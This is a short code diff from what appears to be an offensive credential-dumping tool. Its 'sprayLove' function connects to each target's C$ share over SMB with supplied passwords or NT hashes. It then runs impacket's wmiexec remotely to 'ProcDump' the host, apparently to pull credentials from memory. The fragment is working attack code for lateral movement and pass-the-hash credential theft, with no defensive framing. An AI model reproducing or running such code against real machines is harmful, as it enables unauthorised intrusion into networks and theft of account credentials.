@@ -12,14 +12,15 @@ import wmiexec
 from core.Utils import *
 from core.Colors import *
 from core.Arch import *
+from core.Connection import *
 from multiprocessing import Queue
 
 
 def sprayLove(user, target, local_ip):
     try:
-        exec_method = wmiexec.WMIEXEC('', user.username, user.password, user.domain, user.lmhash + ':' + user.nthash, None, 'ADMIN$', False, False, None)
-        logging.info("%s%s: %swmiexec%s seems to be an %sOK%s method. Fire!" % (infoYellow, target, green, white, green, white))
+        smbConnection = Connection(user.username, user.password, user.domain, user.lmhash + ':' + user.nthash, None, 'C$', False, False, None).run(target)
+        exec_method = wmiexec.WMIEXEC(smbConnection, user.username, user.password, user.domain, user.lmhash, user.nthash)
+        logging.warning("%sProcDumping %s%s%s. Be patient..." % (infoYellow, green, target, white))
         exec_method.run(target, get_os_arch(target))
     except Exception as e:
-        logging.info("%s%s: %swmiexec%s seems to be an %sKO%s method." % (infoYellow, target, red, white, red, white))
         logging.info("%s%s: %s" % (infoYellow, target, e))
